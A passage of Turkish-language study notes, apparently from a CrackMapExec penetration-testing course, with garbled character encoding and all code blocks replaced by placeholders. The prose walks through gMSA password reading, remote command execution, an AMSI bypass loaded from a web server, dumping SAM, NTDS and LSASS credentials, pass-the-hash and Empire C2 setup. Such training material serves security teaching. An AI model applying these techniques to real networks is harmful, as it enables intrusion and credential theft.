BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


